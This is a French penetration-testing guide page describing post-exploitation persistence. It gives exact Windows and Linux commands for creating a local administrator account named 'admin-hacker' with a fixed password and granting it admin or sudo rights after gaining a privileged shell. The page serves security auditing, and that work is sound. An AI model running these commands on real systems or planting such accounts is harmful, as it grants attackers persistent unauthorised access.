# Créer des comptes administrateurs locaux

|ID          |
|------------|
|CHSTG-POST-03|

## Résumé

Une fois un shell privilégié (NT AUTHORITY\SYSTEM ou root) obtenu par exploitation matérielle (DMA) ou manipulation hors ligne, la création d'un compte administrateur local est une méthode principale pour garantir un accès persistant et « légitime en apparence ». Cela permet à un attaquant de se connecter normalement sans ré-exploiter les vulnérabilités matérielles, contournant ainsi les barrières d'authentification ultérieures.

## Objectifs du test
- Démontrer la capacité d'utiliser un shell privilégié pour créer des comptes administratifs non autorisés.
- Vérifier que le compte nouvellement créé dispose de privilèges administratifs/root complets.
- Évaluer si la création de tels comptes déclenche des alertes de sécurité ou est bloquée par la protection des terminaux.

## Comment tester
Ce test est effectué à l'aide d'un shell privilégié obtenu lors des étapes précédentes de l'audit (ex. par injection DMA ou après déchiffrement du disque).

### Prérequis
- Un shell avec les privilèges **NT AUTHORITY\SYSTEM** (Windows) ou **root** (Linux).
- Aucun accès physique interne n'est requis pour cette étape au niveau logiciel.

### Étapes d'exécution

#### Windows (Invite de commandes/PowerShell)
1. **Créer le compte utilisateur** :
   `net user admin-hacker SuperPassword1! /add`
2. **Attribuer les privilèges administratifs** :
   `net localgroup administrators admin-hacker /add`
3. **Vérification :** Tenter de se connecter avec les nouveaux identifiants ou exécuter `net localgroup administrators` pour confirmer que le compte est listé.

#### Linux (Terminal)
1. **Créer le compte utilisateur et le répertoire personnel** :
   `useradd -m -s /bin/bash admin-hacker`
2. **Définir le mot de passe** :
   `echo "admin-hacker:SuperPassword1!" | chpasswd`
3. **Attribuer les privilèges root (via sudo ou groupe wheel)** :
   - Sur Debian/Ubuntu : `usermod -aG sudo admin-hacker`
   - Sur RHEL/CentOS : `usermod -aG wheel admin-hacker`
4. **Vérification :** Passer au nouvel utilisateur et vérifier l'accès root : `su - admin-hacker` puis `sudo whoami`.

## Remédiation
Comme indiqué, si les protections matérielles ou disque initiales ont échoué, il n'y a pas de remédiation matérielle directe pour empêcher la création de comptes.
